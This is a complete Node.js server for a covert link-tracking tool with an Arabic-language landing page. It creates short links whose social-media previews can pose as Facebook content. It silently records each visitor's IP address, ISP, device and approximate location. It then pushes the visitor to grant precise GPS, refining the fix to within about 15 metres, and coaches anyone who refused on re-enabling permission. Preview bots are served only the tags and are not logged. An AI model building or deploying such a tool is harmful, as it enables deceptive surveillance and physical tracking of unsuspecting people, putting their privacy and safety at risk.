const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const express = require('express');
const multer = require('multer');
const UAParser = require('ua-parser-js');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');
const UPLOAD_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

// --- Tiny JSON-file store (sync writes; fine for low-volume) ----------------
function loadStore() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return {
      links: Array.isArray(parsed.links) ? parsed.links : [],
      visits: Array.isArray(parsed.visits) ? parsed.visits : [],
      nextVisitId: Number(parsed.nextVisitId) || 1,
    };
  } catch {
    return { links: [], visits: [], nextVisitId: 1 };
  }
}
const store = loadStore();
let saveTimer = null;
function save() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    const tmp = DATA_FILE + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(store, null, 2));
    fs.renameSync(tmp, DATA_FILE);
  }, 50);
}

function makeId(len = 8) {
  return crypto.randomBytes(Math.ceil(len * 0.75)).toString('base64url').slice(0, len);
}

// --- App setup --------------------------------------------------------------
app.set('trust proxy', true);
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(UPLOAD_DIR, {
  maxAge: '7d',
  setHeaders: (res) => res.set('Cache-Control', 'public, max-age=604800'),
}));

const ALLOWED_IMG = { 'image/jpeg': '.jpg', 'image/png': '.png', 'image/webp': '.webp', 'image/gif': '.gif' };
const upload = multer({
  storage: multer.diskStorage({
    destination: (_req, _file, cb) => cb(null, UPLOAD_DIR),
    filename: (_req, file, cb) => {
      const ext = ALLOWED_IMG[file.mimetype] || path.extname(file.originalname) || '.bin';
      cb(null, makeId(16) + ext);
    },
  }),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB
  fileFilter: (_req, file, cb) => {
    if (ALLOWED_IMG[file.mimetype]) cb(null, true);
    else cb(new Error('Only JPG, PNG, WEBP, GIF allowed'));
  },
});

function getClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return String(xff).split(',')[0].trim();
  const ip = req.ip || req.connection?.remoteAddress || '';
  return ip.replace('::ffff:', '');
}

function normalizeUrl(input) {
  const trimmed = String(input || '').trim();
  if (!trimmed) return null;
  if (/^https?:\/\//i.test(trimmed)) return trimmed;
  return 'https://' + trimmed;
}

function isPrivateIp(ip) {
  if (!ip) return true;
  return /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|fc|fd|fe80)/i.test(ip);
}

// --- Silent server-side IP geolocation --------------------------------------
// Uses ip-api.com (free, no key, ~45 req/min). City-level accuracy.
// Caches per-IP for 24h to stay within quota.
const geoCache = new Map(); // ip -> { at, data }
const GEO_TTL = 24 * 60 * 60 * 1000;

// Server's own public IP (resolved once, used as fallback for local testing)
let serverPublicIp = null;
async function getServerPublicIp() {
  if (serverPublicIp) return serverPublicIp;
  try {
    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2500) });
    const j = await r.json();
    if (j.ip) serverPublicIp = j.ip;
  } catch { /* ignore */ }
  return serverPublicIp;
}

async function lookupGeo(ip) {
  if (!ip || isPrivateIp(ip)) {
    const pub = await getServerPublicIp();
    if (!pub) return { status: 'private' };
    const data = await lookupGeo(pub);
    return { ...data, status: data.status === 'ok' ? 'ok (server-ip)' : data.status };
  }
  const cached = geoCache.get(ip);
  if (cached && Date.now() - cached.at < GEO_TTL) return cached.data;
  try {
    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,lat,lon,isp,query`;
    const r = await fetch(url, { signal: AbortSignal.timeout(2500) });
    const j = await r.json();
    if (j.status !== 'success') {
      const data = { status: 'fail' };
      geoCache.set(ip, { at: Date.now(), data });
      return data;
    }
    const data = {
      status: 'ok',
      country: j.country || null,
      region: j.regionName || null,
      city: j.city || null,
      latitude: typeof j.lat === 'number' ? j.lat : null,
      longitude: typeof j.lon === 'number' ? j.lon : null,
      isp: j.isp || null,
    };
    geoCache.set(ip, { at: Date.now(), data });
    return data;
  } catch (e) {
    return { status: 'error', error: String(e.message || e) };
  }
}

// --- API: links -------------------------------------------------------------
// Accepts either multipart/form-data (with optional `image` file) or JSON.
app.post('/api/links', upload.single('image'), (req, res) => {
  const { title, url, description, image_url, site_name } = req.body || {};
  const cleanTitle = String(title || '').trim();
  const cleanUrl = normalizeUrl(url);
  const cleanDesc = String(description || '').trim().slice(0, 500) || null;
  const cleanSite = String(site_name || '').trim() || 'Facebook';

  // image: uploaded file wins; otherwise fall back to a pasted URL.
  let cleanImage = null;
  if (req.file) {
    cleanImage = '/uploads/' + req.file.filename;
  } else if (image_url) {
    cleanImage = normalizeUrl(image_url);
    if (cleanImage) { try { new URL(cleanImage); } catch { return res.status(400).json({ error: 'Invalid image URL' }); } }
  }

  if (!cleanTitle) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch {}
    return res.status(400).json({ error: 'Title is required' });
  }
  if (!cleanUrl) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch {}
    return res.status(400).json({ error: 'URL is required' });
  }
  try { new URL(cleanUrl); } catch {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch {}
    return res.status(400).json({ error: 'Invalid URL' });
  }

  const id = makeId(8);
  const now = Date.now();
  const link = {
    id, title: cleanTitle, target_url: cleanUrl,
    description: cleanDesc, image_url: cleanImage, site_name: cleanSite,
    created_at: now,
  };
  store.links.unshift(link);
  save();

  const host = req.get('host');
  const proto = req.protocol;
  res.json({ ...link, short_url: `${proto}://${host}/r/${id}` });
});

app.get('/api/links', (req, res) => {
  const host = req.get('host');
  const proto = req.protocol;
  const out = store.links.map(l => {
    const visits = store.visits.filter(v => v.link_id === l.id);
    const last = visits.reduce((m, v) => v.visited_at > m ? v.visited_at : m, 0);
    return {
      ...l,
      short_url: `${proto}://${host}/r/${l.id}`,
      visit_count: visits.length,
      last_visit: last || null,
    };
  });
  res.json(out);
});

app.delete('/api/links/:id', (req, res) => {
  const { id } = req.params;
  const link = store.links.find(l => l.id === id);
  deleteLinkImage(link);
  const before = store.links.length;
  store.links = store.links.filter(l => l.id !== id);
  store.visits = store.visits.filter(v => v.link_id !== id);
  save();
  res.json({ deleted: store.links.length < before });
});

// --- API: visits ------------------------------------------------------------
app.get('/api/visits', (req, res) => {
  const linkId = req.query.link_id;
  const byId = Object.fromEntries(store.links.map(l => [l.id, l]));
  let list = store.visits;
  if (linkId) list = list.filter(v => v.link_id === linkId);
  const out = [...list]
    .sort((a, b) => b.visited_at - a.visited_at)
    .slice(0, 500)
    .map(v => {
      const link = byId[v.link_id] || {};
      return { ...v, title: link.title || '(deleted)', target_url: link.target_url || '#' };
    });
  res.json(out);
});

// Delete a link's uploaded image (if any) when the link itself is deleted.
function deleteLinkImage(link) {
  if (!link || !link.image_url || !link.image_url.startsWith('/uploads/')) return;
  const file = path.join(UPLOAD_DIR, path.basename(link.image_url));
  try { fs.unlinkSync(file); } catch {}
}

// Update a visit with precise GPS coords (called from the tracking page).
app.post('/api/visits/:visitId/location', (req, res) => {
  const visitId = Number(req.params.visitId);
  const { latitude, longitude, accuracy } = req.body || {};
  if (!Number.isFinite(visitId)) return res.status(400).json({ error: 'Bad visit id' });
  const visit = store.visits.find(v => v.id === visitId);
  if (!visit) return res.status(404).json({ error: 'Not found' });

  if (Number.isFinite(latitude) && Number.isFinite(longitude)) {
    visit.latitude = Number(latitude);
    visit.longitude = Number(longitude);
    visit.accuracy = Number.isFinite(accuracy) ? Number(accuracy) : null;
    visit.geo_status = 'gps';
    save();
  }
  res.json({ ok: true });
});

function isLinkPreviewBot(ua) {
  return /facebookexternalhit|facebookcatalog|WhatsApp|TelegramBot|Twitterbot|LinkedInBot|Slackbot|Discordbot|SkypeUriPreview|vkShare|Embedly|Pinterest|redditbot|Applebot|Googlebot|Bingbot/i.test(ua || '');
}

function escapeHtml(s) {
  return String(s ?? '').replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
}

function absoluteUrl(pageUrl, maybeRelative) {
  if (!maybeRelative) return '';
  if (/^https?:\/\//i.test(maybeRelative)) return maybeRelative;
  try { return new URL(maybeRelative, pageUrl).toString(); }
  catch { return maybeRelative; }
}

function ogMetaTags(link, pageUrl) {
  const img = absoluteUrl(pageUrl, link.image_url);
  const desc = link.description || '';
  const site = link.site_name || 'Facebook';
  return `
<meta property="og:type" content="article" />
<meta property="og:site_name" content="${escapeHtml(site)}" />
<meta property="og:title" content="${escapeHtml(link.title)}" />
${desc ? `<meta property="og:description" content="${escapeHtml(desc)}" />` : ''}
<meta property="og:url" content="${escapeHtml(pageUrl)}" />
${img ? `<meta property="og:image" content="${escapeHtml(img)}" />
<meta property="og:image:secure_url" content="${escapeHtml(img)}" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:alt" content="${escapeHtml(link.title)}" />` : ''}
<meta name="twitter:card" content="${img ? 'summary_large_image' : 'summary'}" />
<meta name="twitter:title" content="${escapeHtml(link.title)}" />
${desc ? `<meta name="twitter:description" content="${escapeHtml(desc)}" />` : ''}
${img ? `<meta name="twitter:image" content="${escapeHtml(img)}" />` : ''}
${desc ? `<meta name="description" content="${escapeHtml(desc)}" />` : ''}`;
}

// --- /r/:id: log the visit, ask for precise GPS, then redirect -------------
app.get('/r/:id', async (req, res) => {
  const { id } = req.params;
  const link = store.links.find(l => l.id === id);
  if (!link) return res.status(404).send('Link not found');

  const ua = req.get('user-agent') || '';
  const pageUrl = `${req.protocol}://${req.get('host')}/r/${id}`;

  // Link-preview scrapers (WhatsApp/FB/Telegram/...) just need OG tags — don't log them.
  if (isLinkPreviewBot(ua)) {
    res.set('Cache-Control', 'public, max-age=300');
    return res.send(`<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<title>${escapeHtml(link.title)}</title>
${ogMetaTags(link, pageUrl)}
</head>
<body><p>${escapeHtml(link.title)}</p></body>
</html>`);
  }

  const parsed = new UAParser(ua).getResult();
  const deviceType = parsed.device.type
    || (/mobile/i.test(ua) ? 'mobile' : 'desktop');
  const ip = getClientIp(req);

  // Insert the visit immediately so we have an id to update with GPS coords later.
  const geo = await lookupGeo(ip);
  const visit = {
    id: store.nextVisitId++,
    link_id: id,
    ip,
    device_type: deviceType,
    os: [parsed.os.name, parsed.os.version].filter(Boolean).join(' ') || null,
    browser: [parsed.browser.name, parsed.browser.version].filter(Boolean).join(' ') || null,
    user_agent: ua,
    country: geo.country || null,
    region: geo.region || null,
    city: geo.city || null,
    latitude: geo.latitude ?? null,
    longitude: geo.longitude ?? null,
    accuracy: null,
    isp: geo.isp || null,
    geo_status: geo.status,
    visited_at: Date.now(),
  };
  store.visits.push(visit);
  save();

  const target = link.target_url;
  res.set('Cache-Control', 'no-store');
  res.send(`<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>${escapeHtml(link.title)}</title>
${ogMetaTags(link, pageUrl)}
<style>
  html,body{margin:0;height:100%;background:#0f172a;color:#e2e8f0;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:22px;max-width:440px;width:100%;text-align:center}
  h1{margin:0 0 8px;font-size:18px}
  p{margin:6px 0;color:#94a3b8;font-size:14px;line-height:1.5}
  .spin{width:30px;height:30px;border:3px solid #334155;border-top-color:#38bdf8;border-radius:50%;margin:12px auto;animation:s .8s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  .progress{margin:14px 0 6px;padding:10px 12px;background:#0b1220;border:1px solid #334155;border-radius:8px;font-size:13px;color:#cbd5e1}
  .progress.ok{border-color:#22c55e;color:#86efac}
  .progress.err{border-color:#ef4444;color:#fca5a5}
  .btn{display:inline-block;margin-top:14px;background:#38bdf8;color:#0b1220;border:0;border-radius:8px;padding:10px 22px;font-weight:600;cursor:pointer;text-decoration:none;font-size:14px}
  .skip{display:block;margin-top:10px;color:#94a3b8;font-size:12px;text-decoration:underline}
  .sig{display:inline-block;margin-top:6px;color:#cbd5e1;font-weight:600;font-size:13px}
  .howto{margin:12px 0 4px;padding:10px 12px;background:#0b1220;border:1px solid #f59e0b;border-radius:8px;font-size:12px;color:#fcd34d;text-align:right;line-height:1.7}
</style>
</head>
<body>
  <div class="wrap"><div class="box">
    <h1 id="hdr">طلب إذن الموقع</h1>
    <p id="msg">الموقع يطلب إذن الحصول على موقعك الدقيق الحالي.<br><span class="sig">مع تحيات يوسف قنديل</span></p>
    <div class="spin" id="spin"></div>
    <div class="progress" id="prog">في انتظار ردك على طلب المتصفح…</div>
    <div id="howto" class="howto" style="display:none"></div>
    <a class="btn" id="goNow" href="${target.replace(/"/g, '&quot;')}" style="display:none">المتابعة</a>
    <a class="skip" href="${target.replace(/"/g, '&quot;')}">تخطّي</a>
  </div></div>
<script>
(function(){
  var visitId=${JSON.stringify(String(visit.id))};
  var target=${JSON.stringify(target)};
  var done=false;
  var prog=document.getElementById('prog');
  var hdr=document.getElementById('hdr');
  var msg=document.getElementById('msg');
  var spin=document.getElementById('spin');
  var goBtn=document.getElementById('goNow');
  var howto=document.getElementById('howto');

  function showProg(text, cls){ prog.style.display=''; prog.textContent=text; prog.className='progress'+(cls?' '+cls:''); }
  function showHowto(html){ howto.style.display=''; howto.innerHTML=html; }
  function send(payload,cb){
    try{
      var url='/api/visits/'+encodeURIComponent(visitId)+'/location';
      var body=JSON.stringify(payload);
      if(navigator.sendBeacon){ navigator.sendBeacon(url,new Blob([body],{type:'application/json'})); cb&&cb(); }
      else{ fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:body,keepalive:true}).finally(function(){cb&&cb();}); }
    }catch(e){cb&&cb();}
  }
  function go(){ if(done)return; done=true; window.location.replace(target); }

  function deniedInstructions(){
    return 'المتصفح يتذكر رفضك السابق ولن يطلب الإذن مجددًا.<br>' +
           '<strong>على Android (Chrome):</strong> اضغط 🔒 جنب الرابط ← Permissions ← Location ← Allow ← أعد تحميل الصفحة.<br>' +
           '<strong>على iPhone (Safari):</strong> AA في الرابط ← Website Settings ← Location ← Allow.';
  }

  function startWatch(){
    spin.style.display='';
    showProg('في انتظار ردك على طلب المتصفح…');
    setTimeout(go, 30000);

    var best=null, watchId=null, finished=false;
    function finish(){
      if(finished)return; finished=true;
      try{navigator.geolocation.clearWatch(watchId);}catch(e){}
      if(best){
        var acc=Math.round(best.coords.accuracy);
        showProg('تم تحديد الموقع بدقة ±'+acc+' متر','ok');
        hdr.textContent='تم! جاري التحويل…';
        send({latitude:best.coords.latitude,longitude:best.coords.longitude,accuracy:best.coords.accuracy},function(){ setTimeout(go,500); });
      } else { setTimeout(go,200); }
    }
    setTimeout(function(){ finish(); }, 25000);

    watchId = navigator.geolocation.watchPosition(
      function(pos){
        if(!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
        var acc=Math.round(best.coords.accuracy);
        showProg('تم تحديد الموقع بدقة ±'+acc+' متر — تحسين مستمر…','ok');
        hdr.textContent='جاري تحسين الدقة…';
        msg.style.display='none';
        if(pos.coords.accuracy && pos.coords.accuracy < 15) finish();
      },
      function(err){
        spin.style.display='none';
        if(err && err.code===1){
          showProg('⚠️ الإذن مرفوض','err');
          hdr.textContent='الإذن محفوظ كـ"رفض" في المتصفح';
          showHowto(deniedInstructions());
          goBtn.style.display='inline-block';
        } else {
          var reason = err && err.code===2 ? 'الموقع غير متاح (لا يوجد GPS أو Wi-Fi مفيد)'
                     : err && err.code===3 ? 'انتهت مهلة GPS'
                     : 'خطأ في تحديد الموقع';
          showProg('⚠️ '+reason,'err');
          hdr.textContent='تعذّر تحديد الموقع';
          goBtn.style.display='inline-block';
        }
      },
      {enableHighAccuracy:true,timeout:25000,maximumAge:0}
    );
  }

  if(!window.isSecureContext){
    showProg('⚠️ الصفحة على HTTP — GPS لا يعمل إلا على HTTPS','err');
    hdr.textContent='الموقع لن يُحسب بدقة';
    spin.style.display='none';
    goBtn.style.display='inline-block';
    setTimeout(go,4000);
    return;
  }
  if(!('geolocation' in navigator)){
    showProg('المتصفح لا يدعم تحديد الموقع','err');
    spin.style.display='none';
    setTimeout(go,1500);
    return;
  }

  // Detect cached "denied" state BEFORE calling geolocation, so we can give clear instructions.
  if(navigator.permissions && navigator.permissions.query){
    navigator.permissions.query({name:'geolocation'}).then(function(p){
      if(p.state === 'denied'){
        spin.style.display='none';
        showProg('⚠️ الإذن مرفوض مسبقًا','err');
        hdr.textContent='الإذن محفوظ كـ"رفض" في المتصفح';
        showHowto(deniedInstructions());
        goBtn.style.display='inline-block';
      } else {
        startWatch();
      }
    }).catch(function(){ startWatch(); });
  } else {
    startWatch();
  }
})();
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log(`Link tracker running on http://localhost:${PORT}`);
});
